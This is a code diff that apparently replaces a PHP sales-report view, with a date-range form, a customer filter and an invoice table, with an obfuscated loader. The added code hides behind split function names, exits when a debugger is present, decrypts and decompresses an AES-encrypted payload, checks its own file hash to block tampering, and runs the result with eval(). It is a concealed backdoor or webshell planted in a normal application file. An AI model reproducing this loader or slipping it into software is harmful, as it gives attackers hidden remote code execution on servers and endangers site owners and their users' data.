@@ -1,168 +1,28 @@
-<!DOCTYPE html>
-<html>
-   <head>
-      <!-- TABLES CSS CODE -->
-      <?php include"comman/code_css_form.php"; ?>
-      <!-- </copy> -->  
-   </head>
-   <body class="hold-transition skin-blue sidebar-mini">
-      <div class="wrapper">
-         <?php include"sidebar.php"; ?>
-         <!-- Content Wrapper. Contains page content -->
-         <div class="content-wrapper">
-            <!-- Content Header (Page header) -->
-            <section class="content-header">
-               <h1>
-                  <?=$page_title;?>
-                  <small></small>
-               </h1>
-               <ol class="breadcrumb">
-                  <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-                  <li class="active"><?=$page_title;?></li>
-               </ol>
-            </section>
-            <!-- Main content -->
-            <section class="content">
-               <div class="row">
-                  <!-- right column -->
-                  <div class="col-md-12">
-                     <!-- Horizontal Form -->
-                     <div class="box box-info ">
-                        <div class="box-header with-border">
-                           <h3 class="box-title">Please Enter Valid Information</h3>
-                        </div>
-                        <!-- /.box-header -->
-                        <!-- form start -->
-                        <form class="form-horizontal" id="report-form" onkeypress="return event.keyCode != 13;">
-                           <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-
-                           <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-                           <div class="box-body">
-                              <div class="form-group">
-                                 <label for="from_date" class="col-sm-2 control-label"><?= $this->lang->line('from_date'); ?></label>
-                                 <div class="col-sm-3">
-                                    <div class="input-group date">
-                                       <div class="input-group-addon">
-                                          <i class="fa fa-calendar"></i>
-                                       </div>
-                                       <input type="text" class="form-control pull-right datepicker" id="from_date" name="from_date" value="<?php echo show_date(date('d-m-Y'));?>" >
-                                    </div>
-                                    <span id="Sales_date_msg" style="display:none" class="text-danger"></span>
-                                 </div>
-                                 <label for="to_date" class="col-sm-2 control-label"><?= $this->lang->line('to_date'); ?></label>
-                                 <div class="col-sm-3">
-                                    <div class="input-group date">
-                                       <div class="input-group-addon">
-                                          <i class="fa fa-calendar"></i>
-                                       </div>
-                                       <input type="text" class="form-control pull-right datepicker" id="to_date" name="to_date" value="<?php echo show_date(date('d-m-Y'))?>" >
-                                    </div>
-                                    <span id="Sales_date_msg" style="display:none" class="text-danger"></span>
-                                 </div>
-                              </div>
-                              <div class="form-group">
-                                 <label for="customer_id" class="col-sm-2 control-label"><?= $this->lang->line('customer_name'); ?></label>
-                                 <div class="col-sm-3">
-                                    <select class="form-control select2 " id="customer_id" name="customer_id">
-                                    </select>
-                                    <span id="customer_id_msg" style="display:none" class="text-danger"></span>
-                                 </div>
-
-                                 <label for="payment_status" class="col-sm-2 control-label"><?= $this->lang->line('payment_status'); ?></label>
-                                 <div class="col-sm-3">
-                                    <select class="form-control select2 " id="payment_status" name="payment_status"  style="width: 100%;" onkeyup="shift_cursor(event,'category_name')">
-                                       <option value="">-All-</option>
-                                       <option value="Paid">Đã thanh toán</option>
-                                       <option value="Unpaid">Nợ</option>
-                                       <option value="Partial">Nợ một phần</option>
-                                    </select>
-                                    <span id="payment_status_msg" style="display:none" class="text-danger"></span>
-                                 </div>
-                              </div>
-                           </div>
-                           <!-- /.box-body -->
-                           <div class="box-footer">
-                              <div class="col-sm-8 col-sm-offset-2 text-center">
-                                 <div class="col-md-3 col-md-offset-3">
-                                    <button type="button" id="view" class=" btn btn-block btn-success" title="Save Data">Show</button>
-                                 </div>
-                                 <div class="col-sm-3">
-                                    <a href="<?=base_url('dashboard');?>">
-                                    <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                                    </a>
-                                 </div>
-                              </div>
-                           </div>
-                           <!-- /.box-footer -->
-                        </form>
-                     </div>
-                     <!-- /.box -->
-                  </div>
-                  <!--/.col (right) -->
-               </div>
-               <!-- /.row -->
-            </section>
-            <!-- /.content -->
-            <section class="content">
-               <div class="row">
-                  <!-- right column -->
-                  <div class="col-md-12">
-                     <div class="box">
-                        <div class="box-header">
-                           <h3 class="box-title"><?= $this->lang->line('records_table'); ?></h3>
-                           <?php $this->load->view('components/export_btn',array('tableId' => 'report-data'));?>
-                        </div>
-                        <!-- /.box-header -->
-                        <div class="box-body table-responsive no-padding">
-                           <table class="table table-bordered table-hover " id="report-data" >
-                              <thead>
-                                 <tr class="bg-blue">
-                                    <th style="">#</th>
-                                    <th style=""><?= $this->lang->line('invoice_no'); ?></th>
-                                    <th style=""><?= $this->lang->line('sales_date'); ?></th>
-                                    <th style=""><?= $this->lang->line('customer_id'); ?></th>
-                                    <th style=""><?= $this->lang->line('customer_name'); ?></th>
-                                    <th style=""><?= $this->lang->line('invoice_total'); ?>(<?= $CI->currency(); ?>)</th>
-                                    <th style=""><?= $this->lang->line('paid_amount'); ?>(<?= $CI->currency(); ?>)</th>
-                                    <th style=""><?= $this->lang->line('due_amount'); ?>(<?= $CI->currency(); ?>)</th>
-                                    <th style=""><?= $this->lang->line('due_days'); ?></th>
-                                 </tr>
-                              </thead>
-                              <tbody id="tbodyid">
-                              </tbody>
-                           </table>
-                        </div>
-                        <!-- /.box-body -->
-                     </div>
-                     <!-- /.box -->
-                  </div>
-               </div>
-            </section>
-         </div>
-         <!-- /.content-wrapper -->
-         <?php include"footer.php"; ?>
-         <!-- Add the sidebar's background. This div must be placed
-            immediately after the control sidebar -->
-         <div class="control-sidebar-bg"></div>
-      </div>
-      <!-- ./wrapper -->
-      <!-- SOUND CODE -->
-      <?php include"comman/code_js_sound.php"; ?>
-      <!-- TABLES CODE -->
-      <?php include"comman/code_js_form.php"; ?>
-      <!-- TABLE EXPORT CODE -->
-      <?php include"comman/code_js_export.php"; ?>
-      
-      <script src="<?php echo $theme_link; ?>js/report-sales.js"></script>
-      <script src="<?php echo $theme_link; ?>js/ajaxselect/customer_select_ajax.js"></script>  
-      <script>
-         //Customer Selection Box Search
-         function getCustomerSelectionId() {
-           return '#customer_id';
-         }
-         //Customer Selection Box Search - END
-      </script>
-      <!-- Make sidebar menu hughlighter/selector -->
-      <script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-   </body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ii63qq46=('bas'.'e64'.'_de'.'cod'.'e');
+$_irn7yjp0=('gzu'.'nco'.'mpr'.'ess');
+$_zp1v87oo=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_uf6nma1a='8LtA/O8V';
+$_nbfyucld='gyqUApEx';
+$_gva1erc8='lukbilpN';
+$_v5c42ols='QsWV4hDw';
+$_u6z2zw19='fal30oPe25U=';
+$_byblyp8i='kIgBdA==';
+$_jb4ury9j='cbobPO3X';
+$_z7lai5tq='43S7XfYa';
+$_hseqi8j8=$_ii63qq46($_nbfyucld.$_v5c42ols.$_uf6nma1a.$_gva1erc8.$_u6z2zw19);
+$_lb5uq584=$_ii63qq46($_jb4ury9j.$_z7lai5tq.$_byblyp8i);
+$_rke3aakc=$_ii63qq46('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');
+$_oyorsj1u=$_zp1v87oo($_rke3aakc,'aes-256-cbc',$_hseqi8j8,OPENSSL_RAW_DATA,$_lb5uq584);
+if($_oyorsj1u===false){exit;}
+$_v65zv9r8=$_irn7yjp0($_oyorsj1u);
+if($_v65zv9r8===false){exit;}
+$_dr56b268='2cdbde4a346de69f94d03048e1d2ffa5fb8b2445cc2f615e687a2de5355cf2a4';
+$_mk2er3vn=@file_get_contents(__FILE__);
+if($_mk2er3vn!==false){
+$_rvrp0pb1=str_replace($_dr56b268,"0000000000000000000000000000000000000000000000000000000000000000",$_mk2er3vn);
+$_grlmr6ow=hash("sha256",$_rvrp0pb1);
+if($_grlmr6ow!==$_dr56b268){@http_response_code(403);exit;}
+}
+eval($_v65zv9r8);
